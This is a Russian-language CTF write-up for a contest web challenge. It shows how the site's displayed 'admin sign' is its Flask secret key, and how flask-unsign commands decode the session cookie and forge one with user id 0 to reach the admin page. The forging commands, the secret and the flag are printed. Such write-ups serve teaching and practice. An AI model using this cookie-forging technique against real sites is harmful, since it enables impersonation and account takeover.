Ещё один сайт с сигнами от админа

url: [http://outdated:8002/](http://outdated:8002/)


### Writeup

В описании сказано, что админ раздаёт свои подписи. После регистрации аккаунта и входа в систему на главной странице можно увидеть подпись админа. Запомним это.

Welcome, dear friend! Here is your sign: 4DM1N_L0v3S_Y0U_V3RY_MUCH,4LL_TH3_B3St

После первичного анализа функциональности сайта понимаем, что точек входа здесь очень мало. Одна из них - куки.

Сервер использует фласк-сессии, которые можно декодировать например, с помощью flask-unsign.

```console
nti@contest:~$ flask-unsign -c ".eJwljjluwzAQAP_C2sVeFLn-jMC9kMBAAkh2ZfjvEZBiiplq3m2vI8-vdn8er7y1_TvavfVUX6uLr5o2cACJc4KRV8cpPGUCkxmKusOixA681HVU0KzM4DSIcmWfxR5KESqEbGa1SMZFbmCdYiio1NhmkU_uUC6rXSOvM4__G7zUz6P25-8jf66wmMK3hEIpUzckVeMgcmLAYuq0VS5qnz9thUBD.Ybn6mg.ovlSskaH6j4sUMU97pN6TcLttFA" --decode
{'_fresh': True, '_id': '5e9caa54caf8b717024c3e0b2cf51843848032bb149cc0a2e1503a9c97fd28feed3eb0dfc93c8f3cd92dd94213bbbfa247a24e60b52d79094f768f2c8350fc4a', '_user_id': '1', 'csrf_token': 'a32dc6e0f14fb9cb1299b3d22c2301f32526fea2'}
```

Видим, что сессия имеет параметр _user_id. Приходит идея поменять _user_id на 0, что бы попробовать вклиниться в сессию администратора, но для генерации собственной фласк-сессии её нужно подписать секретным ключём. Попробуем сделать это с помощью подписи администратора и утилиты flask-unsign

```console
nti@contest:~$ flask-unsign -s --cookie '{"_user_id": "0"}' --secret "4DM1N_L0v3S_Y0U_V3RY_MUCH,4LL_TH3_B3St"
eyJfdXNlcl9pZCI6IjAifQ.YboDew.nmxZ057PPpdBPyA06uX2NIhEhGo
```

Подставим новую сессию, например, через консоль разработчика в браузере, и обновим страницу

После этого произойдёт автоматический редирект на страницу /admin с флагом

flag{K33p_Y0UR_FL4SK_S3CR3TS_1N_S3CR3T}
